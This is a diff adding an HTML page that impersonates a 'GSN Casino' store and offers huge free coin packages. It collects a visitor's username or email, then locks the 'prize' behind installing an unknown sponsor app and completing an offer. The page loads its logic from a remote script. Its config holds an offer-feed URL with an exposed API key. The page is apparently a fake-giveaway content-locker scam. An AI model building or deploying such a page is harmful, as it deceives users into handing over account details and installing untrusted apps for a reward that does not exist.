@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GSN Casino | Online Casino Store - Best Deals!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/ok.css" />
+</head>
+<body>
+
+    <div class="page-header" id="globalHeader">
+        <img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/gsn1.webp">
+    </div>
+
+    <div id="mainStore">
+        <div class="store-container" id="packagesGrid"></div>
+    </div>
+
+    <div class="page-header">
+        <img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/gsn2.webp">
+    </div>
+
+    <div id="fullOverlay">
+        <div id="loaderBox" class="loader-box">
+            <div class="loading-spinner"></div>
+        </div>
+        
+        <div id="claimView" class="claim-view">
+            <div class="page-header">
+                <img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/gsn1.webp">
+            </div>
+
+            <div id="selectedCardContainer"></div>
+            
+            <p class="reward-text">
+                Welcome! You have selected <span id="displayCoin" class="coins"></span> Coins <span id="displayCrown" class="crowns"></span>.<br>
+                Please enter your Username or Email below to continue.
+            </p>
+                
+            <input type="text" id="usernameField" class="username-input" placeholder="Enter Username / Email">
+            
+            <button id="nextStepBtn" class="next-step-btn">
+                <img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/Button1.webp">
+                <span class="next-step-btn-text">CONTINUE</span>
+            </button>
+            
+            <img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/gsn2.webp" class="footer-image-locker">
+        </div>
+    </div>
+
+    <div id="lockerArea">
+        <div class="locker-container">
+            <div class="locker-header-bg">
+                 <img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/gsn1.webp" alt="Locker Header">
+            </div>
+            <div class="instruction-text">
+                The final step is to install one of the sponsor applications below that you have never had before, then complete the task.        
+ Complete 1 offer below to unlock your PRIZE.
+
+
+            </div>
+            
+            <div id="offerContainer"></div>
+            <img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/gsn2.webp" class="footer-image-locker">
+        </div>
+    </div>
+ <script id="siteConfig">
+    window.MY_CONFIG = {
+        packageTemplate: `<div class="store-package clm" data-idx="{ID}"><img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/store_tile_2.webp" class="package-bg"><img src="{ICON}" class="pack-icon-overlay"><div class="free-label">FREE</div><div class="coin-value-text"><img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/coin_badge.webp" width="16">{COINS}</div><div class="old-price-text">{OLD}</div><div class="price-overlay"><img src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/Button1.webp" class="btn-custom-bg"><span class="price-text-on-btn">{PRICE}</span></div></div>`,
+        apiAndroid: "https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=511022&api_key=3197b8ec5712836c30c668f82c8c6e4a",
+        checkApi: "https://d1y3y09sav47f5.cloudfront.net/public/external/check2.php?testing=0",
+        successUrl: "#",
+        packages: [
+            { id: 0, coins: "198,000,000", old: "19,800,000", price: "CLAIM", crowns: "210", icon: "https://cdn.jsdelivr.net/gh/monorolls/gsn@main/198.webp" },
+            { id: 1, coins: "99,000,000",  old: "9,900,000",  price: "CLAIM", crowns: "105", icon: "https://cdn.jsdelivr.net/gh/monorolls/gsn@main/99.webp" },
+            { id: 2, coins: "49,500,000",  old: "4,950,000",  price: "CLAIM", crowns: "52",  icon: "https://cdn.jsdelivr.net/gh/monorolls/gsn@main/49.webp" },
+            { id: 3, coins: "24,750,000",  old: "2,475,000",  price: "CLAIM", crowns: "26",  icon: "https://cdn.jsdelivr.net/gh/monorolls/gsn@main/24.webp" },
+        ]
+    };
+</script>
+<script id="coreLogic" src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/sser.js" async></script>
+
+  </body>
+</html>
